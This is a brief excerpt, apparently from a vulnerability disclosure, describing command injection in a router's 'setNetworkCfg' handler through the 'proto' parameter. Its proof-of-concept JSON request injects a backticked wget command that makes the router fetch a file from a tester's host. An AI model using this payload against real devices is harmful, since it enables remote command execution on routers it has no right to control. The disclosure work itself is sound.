...
In sub_428414 function, it reads in a user-provided parameter `proto` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `proto` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setNetworkCfg","proto":"`wget 192.168.6.1:7777/testpoc`"
}
```
